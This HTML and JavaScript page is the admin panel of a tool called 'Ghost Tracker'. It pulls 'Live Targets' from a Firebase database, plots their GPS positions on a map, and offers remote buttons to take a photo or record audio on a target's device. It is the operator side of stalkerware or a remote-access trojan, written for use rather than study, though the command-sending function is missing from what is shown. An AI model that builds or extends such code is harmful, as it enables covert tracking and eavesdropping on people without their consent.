<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard - Ghost Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { display: flex; height: 100vh; margin: 0; background: #111; color: white; font-family: 'Segoe UI', sans-serif; }
        #sidebar { width: 250px; background: #222; border-right: 1px solid #444; overflow-y: auto; padding: 10px; }
        #main { flex-grow: 1; position: relative; }
        .user-item { padding: 15px; border-bottom: 1px solid #333; cursor: pointer; }
        .user-item:hover { background: #333; }
        #map { height: 70%; width: 100%; }
        #logs { height: 30%; background: #000; padding: 10px; overflow-y: auto; font-family: monospace; }
        .controls { position: absolute; top: 10px; right: 10px; z-index: 1000; background: rgba(0,0,0,0.8); padding: 15px; border-radius: 10px; }
    </style>
</head>
<body>
    <div id="sidebar">
        <h3>Live Targets</h3>
        <div id="userList"></div>
    </div>
    <div id="main">
        <div id="map"></div>
        <div class="controls">
            <h4>Remote Commands</h4>
            <button onclick="sendCommand('snap')">Take Photo</button>
            <button onclick="sendCommand('mic')">Record 30s Audio</button>
        </div>
        <div id="logs">--- Live Logs ---</div>
    </div>

    <script>
        const config = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        var map = L.map('map').setView([0,0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        // Fetch Multiple Users
        db.ref('targets').on('value', snapshot => {
            const list = document.getElementById('userList');
            list.innerHTML = "";
            snapshot.forEach(user => {
                let div = document.createElement('div');
                div.className = "user-item";
                div.innerHTML = `<b>${user.key}</b><br><small>Last Seen: ${user.val().location.time}</small>`;
                div.onclick = () => focusTarget(user.key, user.val().location);
                list.appendChild(div);
            });
        });

        function focusTarget(id, loc) {
            L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(id).openPopup();
            map.setView([loc.lat, loc.lng], 18);
            document.getElementById('logs').innerHTML += `<br>[${id}] Lat: ${loc.lat}, Lng: ${loc.lng}`;
        }
    </script>
</body>
</html>
